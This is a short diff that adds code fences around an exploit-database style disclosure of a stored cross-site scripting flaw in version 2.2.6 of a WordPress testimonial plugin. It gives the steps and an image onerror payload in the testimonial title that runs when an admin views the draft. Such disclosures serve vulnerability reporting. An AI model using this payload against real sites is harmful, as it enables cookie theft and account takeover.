@@ -1,3 +1,4 @@
+```
 # Exploit Title: Stored XSS in post_title parameter in WordPress Plugin "Testimonial Slider and Showcase" 2.2.6
 # Date: 05/08/2022
 # Exploit Author: saitamang , yunaranyancat , amd_syad
@@ -13,3 +14,4 @@ Login as Editor > Add testimonial > Under Title inject payload below ; parameter
 payload --> test"/><img/src=""/onerror=alert(document.cookie)>
 
 The draft post can be viewed using Admin account and XSS will be triggered.
+```
